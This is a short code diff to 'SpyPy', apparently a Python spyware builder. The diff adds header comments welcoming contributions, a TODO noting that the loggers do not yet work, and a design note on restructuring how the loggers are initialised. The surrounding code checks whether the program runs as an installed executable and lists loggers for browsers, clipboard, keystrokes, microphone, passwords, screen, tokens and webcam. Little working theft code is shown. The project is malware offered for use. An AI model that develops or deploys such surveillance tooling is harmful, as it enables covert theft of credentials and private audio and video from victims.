@@ -1,3 +1,8 @@
+# SpyPy
+# This file can be ran by either building the project or running it directly.
+# Feel free to modify this project as you wish. Contributions are always welcome.
+
+#TODO: Make all of the loggers actually work
 import tempfile
 import os
 import threading
@@ -51,6 +56,20 @@ class SpyPy:
         self.is_first_run = self.is_exe and not os.path.abspath(__file__).startswith(self.software_dir)
         
         self.setup()
+
+        '''
+        TODO important
+
+        make it so that the logger classes are initialized like this:
+        self.loggers = [
+            BrowserLogger(),
+            ClipboardLogger(),
+            InputLogger(),
+            ...
+            ]
+
+        and in the builder we can remove the lines of the loggers that are not enabled. 
+        '''
 
         self.loggers = []
         logger_names = ["BrowserLogger", "ClipboardLogger", "InputLogger", "MicrophoneLogger", "PasswordLogger", "ScreenLogger", "TokenLogger", "WebcamLogger"]
